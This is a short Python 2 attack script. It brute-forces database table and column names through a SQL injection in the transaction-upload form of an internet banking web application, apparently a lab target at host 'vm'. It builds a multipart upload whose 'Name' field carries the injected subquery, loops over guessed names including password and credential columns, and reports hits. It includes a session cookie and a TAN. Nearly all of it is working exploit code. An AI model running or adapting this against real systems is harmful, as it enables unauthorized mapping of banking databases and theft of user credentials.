# Script to brute force SQL table names.
# Login as client in your browser, adjust the host, the session ID, fill in a valid TAN and run this script.

import httplib, urllib
headers = {
    "Content-type": "multipart/form-data; boundary=---------------------------751413662605855851928112216",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Cookie": "PHPSESSID=8fqb4ba3cd322t4u13k1g2qhv4"
}
content = '-----------------------------751413662605855851928112216\r\nContent-Disposition: form-data; name="tranfile"; filename="form.txt"\r\nContent-Type: text/plain\r\n\r\n'
content += """Name: hbfhgf"OR -1 IN (SELECT t.%s FROM %s AS t) AND "1"="0
Amount: 1
TAN: Io9L0jQTZiFCMWU
Comment: 
sqli

"""
content += "-----------------------------751413662605855851928112216--\r\n"

tables = ["transactions", "transaction", "payments", "payment", "transfers", "transfer", "user", "userrequests", "paymentrequests", "userrequest", "paymentrequest", "transactioncodes", "tans", "tancodes", "trancode", "transcodes", "transcode", "trancodes", "paymentcode", "paymentcodes", "tan"]
columns = ["id", "tan", "transactioncode", "transactionCode", "client", "employee", "clientid", "employeeid", "account", "balance", "accountbalance", "volume", "sum", "trancode", "description", "source", "target", "date", "payer", "receipt", "amount", "purpose", "email", "username", "password", "credentials", "hashpassword", "passwd", "passwordhash", "name", "isemployee", "isadmin", "admin"]

for t in tables:
    for c in columns:
        filledContent = content % (c, t)
        conn = httplib.HTTPConnection("vm:80")
        conn.request("POST", "/InternetBanking/client.php?action=file", filledContent, headers)
        response = conn.getresponse()
        data = response.read()
        if data.find("alert") > 0:
            #print data[data.find("alert"):][:50]
            print "  Success with", t, c
        #else:
        #   print "UnSuccess with", t, c
        conn.close()
